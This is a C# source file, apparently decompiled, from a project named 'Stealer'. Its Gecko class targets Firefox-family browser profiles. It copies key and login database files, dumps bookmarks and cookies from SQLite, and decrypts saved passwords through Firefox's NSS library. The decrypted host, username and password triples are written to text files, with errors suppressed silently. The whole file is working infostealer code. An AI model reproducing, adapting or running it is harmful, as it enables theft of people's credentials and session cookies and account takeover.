using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Stealer.Steal.Decrypt;
using Stealer.Steal.Helper;
using Stealer.Steal.Sql;

namespace Stealer.Steal.Target.Browsers;

internal class Gecko
{
	private static readonly string MozillaPath = "C:\\Program Files\\Mozilla Firefox";

	private static readonly string[] RequiredFiles = new string[4] { "key3.db", "key4.db", "logins.json", "cert9.db" };

	public string ProfilesPath;

	public string name;

	public Browser browser;

	public string BrowserDir;

	public Gecko(string ProfilesPath)
	{
		this.ProfilesPath = ProfilesPath;
		GetBrowserName();
		browser = new Browser();
		browser.Name = name;
		BrowserDir = Path.Combine("Browsers", name);
	}

	public void GetBrowserName()
	{
		string[] array = ProfilesPath.Split(new char[1] { Path.DirectorySeparatorChar });
		name = array[5];
	}

	public string Utf8(string str)
	{
		return Encoding.UTF8.GetString(Encoding.Default.GetBytes(str));
	}

	public void Start()
	{
		try
		{
			List<Thread> list = new List<Thread>();
			string[] directories = Directory.GetDirectories(ProfilesPath);
			foreach (string profile in directories)
			{
				list.Add(new Thread((ThreadStart)delegate
				{
					Logins(profile);
				}));
				list.Add(new Thread((ThreadStart)delegate
				{
					Bookmarks(profile);
				}));
				list.Add(new Thread((ThreadStart)delegate
				{
					Cookies(profile);
				}));
				list.Add(new Thread((ThreadStart)delegate
				{
					Password(profile);
				}));
			}
			foreach (Thread item in list)
			{
				item.Start();
			}
			foreach (Thread item2 in list)
			{
				item2.Join();
			}
			Counter.Browsers.Add(browser);
		}
		catch
		{
		}
	}

	public void Logins(string profile)
	{
		string[] requiredFiles = RequiredFiles;
		foreach (string text in requiredFiles)
		{
			try
			{
				if (File.Exists(Path.Combine(profile, text)))
				{
					DynamicFiles.WriteAllBytes(Path.Combine(BrowserDir, Path.GetFileName(profile), text), File.ReadAllBytes(Path.Combine(profile, text)));
				}
			}
			catch
			{
			}
		}
	}

	public void Bookmarks(string profile)
	{
		try
		{
			string text = Path.Combine(profile, "places.sqlite");
			if (!File.Exists(text))
			{
				return;
			}
			SqLite sqLite = SqlReader.ReadTable(text, "moz_bookmarks");
			if (sqLite == null)
			{
				return;
			}
			List<string> list = new List<string>();
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				string text2 = Utf8(sqLite.GetValue(i, 5));
				if (Utf8(sqLite.GetValue(i, 1)).Equals("0") && !(text2 == "0"))
				{
					list.Add("### " + text2 + " ###");
					browser.Bookmarks++;
				}
			}
			DynamicFiles.WriteAllText(Path.Combine(BrowserDir, Path.GetFileName(profile), "Bookmark.txt"), string.Join("\n", (IEnumerable<string?>)list.ToArray()));
		}
		catch (Exception)
		{
		}
	}

	public void Cookies(string profile)
	{
		try
		{
			string text = Path.Combine(profile, "cookies.sqlite");
			if (!File.Exists(text))
			{
				return;
			}
			SqLite sqLite = SqlReader.ReadTable(text, "moz_cookies");
			if (sqLite != null)
			{
				List<string> list = new List<string>();
				for (int i = 0; i < sqLite.GetRowCount(); i++)
				{
					string value = sqLite.GetValue(i, 4);
					string value2 = sqLite.GetValue(i, 2);
					string value3 = sqLite.GetValue(i, 3);
					string value4 = sqLite.GetValue(i, 5);
					string value5 = sqLite.GetValue(i, 6);
					list.Add(Utf8(value) + "\tTRUE\t" + Utf8(value4) + "\tFALSE\t" + Utf8(value5) + "\t" + Utf8(value2) + "\t" + Utf8(value3) + "\r");
					browser.Cookies++;
				}
				DynamicFiles.WriteAllText(Path.Combine(BrowserDir, Path.GetFileName(profile), "Cookie.txt"), string.Join("\n", (IEnumerable<string?>)list.ToArray()));
			}
		}
		catch
		{
		}
	}

	public void Password(string profile)
	{
		try
		{
			string[] array = Regex.Split(Regex.Split(Regex.Split(File.ReadAllText(Path.Combine(profile, "logins.json")), ",\"logins\":\\[")[1], ",\"potentiallyVulnerablePasswords\"")[0], "},");
			if (!Decryptor.LoadNss(MozillaPath))
			{
				return;
			}
			List<string> list = new List<string>();
			if (Decryptor.SetProfile(profile))
			{
				string[] array2 = array;
				foreach (string input in array2)
				{
					Match match = FfRegex.Hostname.Match(input);
					Match match2 = FfRegex.Username.Match(input);
					Match match3 = FfRegex.Password.Match(input);
					if (match.Success && match2.Success && match3.Success)
					{
						string str = Regex.Split(match.Value, "\"")[3];
						string str2 = Decryptor.DecryptPassword(Regex.Split(match2.Value, "\"")[3]);
						string str3 = Decryptor.DecryptPassword(Regex.Split(match3.Value, "\"")[3]);
						list.Add("Host: " + Utf8(str) + "\nUsername: " + Utf8(str2) + "\nPassword: " + Utf8(str3) + "\n");
						browser.Passwords++;
					}
				}
			}
			DynamicFiles.WriteAllText(Path.Combine(BrowserDir, Path.GetFileName(profile), "Password.txt"), string.Join("\n", (IEnumerable<string?>)list.ToArray()));
			Decryptor.UnLoadNss();
		}
		catch (Exception)
		{
		}
	}
}
